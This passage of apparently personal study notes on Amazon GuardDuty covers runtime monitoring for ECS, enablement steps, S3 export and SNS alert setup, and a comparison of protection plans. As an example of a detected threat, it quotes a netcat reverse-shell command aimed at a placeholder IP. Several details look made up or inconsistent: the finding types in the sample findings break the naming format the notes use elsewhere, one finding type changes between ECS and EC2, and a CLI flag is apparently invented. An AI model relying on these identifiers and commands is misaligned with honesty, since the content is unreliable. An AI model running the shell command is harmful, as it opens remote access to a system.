   When suspicious ECS activity is detected, GuardDuty generates JSON findings that include:

   * **Finding Type** (e.g., `CryptoCurrency:ECS/LinuxCryptominingTool`)
   * **Severity** (0.1–8.9 mapped to Low/Medium/High)
   * **Resource Details**:

     * `resourceType: "Container"`
     * `containerId`, `taskDefinitionArn`, `clusterArn`, `launchType`
   * **Service Action**: network action or API call details
   * **Evidence**: process name, remote IP/domain, API caller ARN
   * **Remediation Guidance**: links to the ECS console and AWS docs

5. **Benefits for ECS Security**

   | Benefit                              | Description                                                                    |
   | ------------------------------------ | ------------------------------------------------------------------------------ |
   | **Container‑Level Threat Detection** | Flags crypto‑mining, binaries, and anomalous process activity inside tasks.    |
   | **Network & API Monitoring**         | Detects port scans, C2 calls, unauthorized task launches, and DNS abuse.       |
   | **Agentless & Serverless‑Aware**     | No sidecars or agents—uses AWS logs and built‑in telemetry for Fargate.        |
   | **Multi‑Stage Attack Correlation**   | Links suspicious EC2, ECS, and other service events for end‑to‑end visibility. |
   | **Automated Response**               | Integrates with EventBridge → Lambda/SNS/Security Hub for immediate action.    |

6. **Cost Model**

   * **Threat Detection Events**

     * **\$4.00 per 1 million events** analyzed from CloudTrail, VPC Flow Logs, DNS Query Logs.
     * Runtime Monitoring events (process execs, file events) are included in this rate.

   * **Free Trial**

     * 30‑day full‑feature trial per Region.

   * **Example Estimate**

     ```
     2 million Flow Log + 0.5 million DNS + 0.3 million CloudTrail events
     = 2.8 M × $4 = $11.20/month
     + Runtime Monitoring telemetry (0.2 M events) included
     = ~$11.20/month total
     ```

</details>

---

# ECS Protection
GuardDuty doesn’t offer an **ECS‑specific** “protection plan.” Instead:

* **Container workloads** on **ECS (both EC2-backed and Fargate)** are covered under **Runtime Monitoring**, which is a **general feature** for EC2/EKS/ECS.
* There is **no standalone “ECS Protection”** toggle in GuardDuty.

<details>
  <summary>Click to see brief analysis for ECS Protection</summary>

## Container Runtime Monitoring (covers ECS & EKS)

**Container Runtime Monitoring (covers ECS & EKS)**

1. **GuardDuty Checks for Container Workloads**
   GuardDuty’s **Runtime Monitoring** feature ingests OS‑ and container‑level telemetry for EC2‑backed ECS tasks and Fargate, plus EKS pods:

   | Data Source / Feature      | What It Captures                                                   | Example Threat & Finding                                                                                               |
   | -------------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------- |
   | **Runtime Monitoring** ⭐️  | Processes, file events, network connections within containers/pods | **Reverse Shell**: Detected `nc -e /bin/bash 192.0.2.10 4444` inside a Fargate task Behavior\:EC2/NetworkPortUnusual |
   | **VPC Flow Logs**          | Network traffic to/from task ENIs                                  | **Portscan**: Task probing container port 8080 Recon\:EC2/PortscanContainerInstance                                  |
   | **DNS Query Logs**         | DNS lookups from within the task’s networking namespace            | **C2 Communication**: Container resolving a known malware domain Backdoor\:EC2/C\&CActivity.B!DNS                    |
   | **CloudTrail Mgmt Events** | ECS API usage—`RunTask`, `StopTask`, `UpdateService`, etc.         | **Unauthorized Task Launch**: `RunTask` by unusual principal UnauthorizedAccess\:EC2/MaliciousIPCaller.Custom        |

   ⭐️ *“Runtime Monitoring” must be explicitly enabled under GuardDuty → Settings → Additional features.*

2. **Enabling Runtime Monitoring**

   * **Console**: GuardDuty → Settings → Additional features → toggle **Runtime Monitoring** → Save
   * **CLI**:

     ```bash
     aws guardduty update-detector \
       --detector-id <detectorId> \
       --enable-runtime-monitoring
     ```

3. **Prerequisites**

   * **IAM**: `guardduty:UpdateDetector`, `iam:CreateServiceLinkedRole`
   * **Service‑Linked Role**: `AWSServiceRoleForAmazonGuardDuty`
   * **Logging**: VPC Flow Logs active on ECS subnets; CloudTrail management events; (optional) Route 53 Resolver logs

4. **What You’ll Receive: ECS‑Task Findings**

   GuardDuty emits JSON findings for suspicious container activity:

   * **Finding Type** (e.g., `CryptoCurrency:EC2/LinuxCryptominingTool`)
   * **Resource Details**: `resourceType: "Container"`, task ARN, cluster ARN, launch type
   * **Evidence**: process names, remote IPs/domains, API caller ARNs
   * **Remediation Guidance**: links to ECS console and docs

5. **Benefits**

   * **Agentless Container Security**: no sidecar or agent needed
   * **OS‑Level Visibility**: catches in‑container threats like crypto‑mining or shells
   * **Network & API Monitoring**: flags both east‑west port scans and control‑plane misuse
   * **Integrated Workflows**: automate with EventBridge, Security Hub, Lambda

6. **Cost**

   * All runtime events (process execs, file events) are billed under the **\$4 per 1 M events** rate (same as VPC, DNS, CloudTrail).

</details>

---

## Amazon GuardDuty Hands-On Documentation
### Key Notes:

* GuardDuty is a **Regional service** — it must be enabled in every AWS Region you wish to monitor.
* It is recommended to enable GuardDuty in **all supported Regions**, including those you don’t actively use, for broader detection.
* A 30-day free trial is available for newly enabled protection features in each Region.
* GuardDuty automatically creates service-linked IAM roles such as:

  * `AWSServiceRoleForAmazonGuardDuty`
  * `AWSServiceRoleForAmazonGuardDutyMalwareProtection`

<details>
  <summary>Click to view step by step hands on as per the documentation</summary>

---

## Step 1: Enable Amazon GuardDuty

### Standalone Account

1. Open GuardDuty console: [https://console.aws.amazon.com/guardduty](https://console.aws.amazon.com/guardduty)
2. Choose **Amazon GuardDuty - All features**.
3. Click **Get Started** > **Enable GuardDuty**.

### Multi-Account via AWS Organizations

* Designate an administrator account.
* Add and enable member accounts.

---

## Step 2: Generate Sample Findings

1. In the GuardDuty console, go to **Settings**.
2. Under **Sample findings**, choose **Generate sample findings**.
3. View results in:

   * **Summary** dashboard
   * **Findings** page (Sample findings will be prefixed with `[SAMPLE]`).
4. Click any finding to:

   * View JSON structure
   * Examine affected resources
   * Apply filters

To archive:

* Select all findings > **Actions** > **Archive**.
* Switch between **Current** and **Archived** view as needed.

---

## Step 3: Export Findings to Amazon S3

Exporting allows you to retain findings beyond the default 90-day retention using encrypted storage in Amazon S3.

### Step-by-Step:

#### 1. Create or Choose a KMS Key

* Go to AWS KMS Console: [https://console.aws.amazon.com/kms](https://console.aws.amazon.com/kms)
* Select or create a symmetric key
* Copy the **Key ARN**
* Edit the key policy to allow GuardDuty access:

```json
{
  "Sid": "AllowGuardDutyKey",
  "Effect": "Allow",
  "Principal": {
    "Service": "guardduty.amazonaws.com"
  },
  "Action": "kms:GenerateDataKey",
  "Resource": "KMS key ARN",
  "Condition": {
    "StringEquals": {
      "aws:SourceAccount": "123456789012",
      "aws:SourceArn": "arn:aws:guardduty:Region:123456789012:detector/SourceDetectorID"
    }
  }
}
```

#### 2. Create or Edit S3 Bucket Policy

* Go to Amazon S3 > Your Bucket > **Permissions** > **Bucket Policy**
* Add policy to allow GuardDuty access (replace placeholders):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Allow PutObject",
      "Effect": "Allow",
      "Principal": {
        "Service": "guardduty.amazonaws.com"
      },
      "Action": "s3:PutObject",
      "Resource": "bucket-arn/path/*",
      "Condition": {
        "StringEquals": {
          "aws:SourceAccount": "123456789012",
          "aws:SourceArn": "arn:aws:guardduty:region:123456789012:detector/detectorID"
        }
      }
    }
  ]
}
```

#### 3. Configure in GuardDuty

* Console > GuardDuty > Settings
* Choose **Configure S3 Export**
* Enter:

  * S3 Bucket ARN
  * KMS Key ARN
* Click **Save**

---

## Step 4: Configure SNS Alert for GuardDuty Findings

### Create SNS Topic

1. Open [Amazon SNS Console](https://console.aws.amazon.com/sns)
2. Go to **Topics** > **Create Topic** > Type: **Standard**
3. Name: `GuardDuty`
4. Click **Create Topic**
5. Create Subscription:

   * Protocol: **Email**
   * Enter your email
   * Confirm via email

### Create EventBridge Rule

1. Open [Amazon EventBridge Console](https://console.aws.amazon.com/events)
2. Go to **Rules** > **Create Rule**
3. Name your rule
4. Source: **AWS Services** > Service: **GuardDuty**
5. Event Type: **GuardDuty Finding**
6. Target: **SNS topic** > Select `GuardDuty`

#### Format Message with Input Transformer

**Input Path:**

```json
{
  "severity": "$.detail.severity",
  "Finding_ID": "$.detail.id",
  "Finding_Type": "$.detail.type",
  "region": "$.region",
  "Finding_description": "$.detail.description"
}
```

**Template:**

```text
You have a severity severity GuardDuty finding type Finding_Type in the Region region.

Description:
Finding_description

See more: https://console.aws.amazon.com/guardduty/home?region=region#/findings?search=id%3DFinding_ID
```

---

## Next Steps

### Customize GuardDuty Behavior

* **Finding Filters:** Create custom filters to group similar findings (e.g., by instance ID or account ID).
* **Suppression Rules:** Automatically archive expected behavior findings.
* **Trusted IP Lists & Threat Lists:** Allowlist or explicitly monitor known IPs.

### Stay Updated

* Use **Security Hub** for centralized monitoring.
* Use **Amazon Detective** for deeper investigations.
* Use **AWS Config** to track compliance changes.

</details>

---

## ✅ GuardDuty Protection Plan Comparison Table

| Protection Plan              | Data Source / Signal                        | Auto-Enabled with GuardDuty?   | Detects                   | Example Threats                                        |
| ---------------------------- | ------------------------------------------- | ------------------------------ | ------------------------- | ------------------------------------------------------ |
| **S3 Protection**            | Amazon S3 Data Events (via CloudTrail)      | ❌ Optional                     | Data-level anomalies      | Data exfiltration, ransomware deletion, access via Tor |
| **EKS Protection**           | Kubernetes Audit Logs                       | ❌ Optional                     | API-level anomalies       | Privilege escalation, unusual API calls                |
| **RDS Protection**           | Login activity to RDS/Aurora DBs            | ❌ Optional                     | Access anomalies          | Brute-force login attempts, unusual DB client IPs      |
| **Lambda Protection**        | VPC Flow Logs (for Lambda functions in VPC) | ❌ Optional                     | Network threats           | Lambda reaching malware hosts, crypto mining           |
| **Runtime Monitoring**       | OS-level events from EC2, ECS, EKS          | ❌ Optional                     | Process and system events | Reverse shells, unauthorized tools                     |
| **Malware Protection (EC2)** | EBS Volume Snapshots (agentless scan)       | ✅ Auto-enabled in most Regions | Malware files             | Detected malware in EBS volumes                        |
| **Malware Protection (S3)**  | Newly uploaded S3 objects                   | ❌ Optional + Independent       | Malware files             | Malicious uploads to public/private buckets            |

---

<details>
  <summary>Sample GuardDuty Finding Outputs</summary>

## Sample GuardDuty Finding Outputs
![image](https://github.com/user-attachments/assets/f8be85a7-3995-4254-864f-2b586e94670d)

### 🪣 S3 Protection Finding

**Finding Type:** `S3.Bucket-Exfiltration.Unusual`
**Severity:** Medium

```json
{
  "resource": {
    "resourceType": "S3Bucket",
    "instanceDetails": {
      "bucketName": "my-finance-records"
    }
  },
  "service": {
    "action": {
      "actionType": "AWS_API_CALL",
      "apiCallDetails": {
        "api": "GetObject",
        "callerType": "Remote IP",
        "remoteIpDetails": {
          "ipAddressV4": "203.0.113.45",
          "country": "Russia"
        }
      }
    },
    "additionalInfo": {
      "anomaly": "Large volume of access from unfamiliar location"
    }
  }
}
```

---

### ☸️ EKS Protection Finding

**Finding Type:** `EKS.AccessKubernetesAPI.AnomalousBehavior`
**Severity:** High

```json
{
  "resource": {
    "resourceType": "KubernetesCluster",
    "instanceDetails": {
      "clusterName": "prod-eks-cluster"
    }
  },
  "service": {
    "action": {
      "apiCallDetails": {
        "api": "createSecret",
        "username": "system:anonymous"
      }
    },
    "additionalInfo": {
      "kubernetesUserAgent": "kubectl/v1.21.1",
      "anomaly": "Unauthorized user attempting to create secret"
    }
  }
}
```

---

### 🛢️ RDS Protection Finding

**Finding Type:** `RDS.LoginAnomaly.Behavioral`
**Severity:** Medium

```json
{
  "resource": {
    "resourceType": "RDSInstance",
    "instanceDetails": {
      "dbInstanceIdentifier": "customer-db-prod"
    }
  },
  "service": {
    "action": {
      "loginDetails": {
        "username": "admin",
        "sourceIp": "45.10.10.12",
        "location": "Unknown"
      }
    },
    "additionalInfo": {
      "anomaly": "Login from a previously unseen location and client"
    }
  }
}
```

---

### ⚡ Lambda Protection Finding

**Finding Type:** `Lambda.FunctionCommunication.MaliciousDomain`
**Severity:** High

```json
{
  "resource": {
    "resourceType": "LambdaFunction",
    "instanceDetails": {
      "functionName": "transaction-handler"
    }
  },
  "service": {
    "action": {
      "networkConnectionAction": {
        "remoteDomain": "cryptominer-malware.com",
        "protocol": "HTTPS"
      }
    },
    "additionalInfo": {
      "threatIntelIndicators": [
        {
          "type": "MaliciousDomain",
          "value": "cryptominer-malware.com"
        }
      ]
    }
  }
}
```

</details>

---

## 📌 Summary

* Once you enable protection plans for **S3, EKS, RDS, and Lambda**, GuardDuty will automatically begin **monitoring all relevant resources** using backend telemetry.
* The findings generated are **context-aware, JSON-formatted**, and **include resource identifiers**, event types, severities, and helpful remediation links.
* You can use EventBridge, Security Hub, or even Lambda to **automate responses** to these findings.

With Amazon GuardDuty:

* You get intelligent threat detection across AWS resources.
* You can automate response workflows.
* You can retain findings securely and gain historical insights.
* You can continuously adapt with filters, suppression rules, and IP lists.


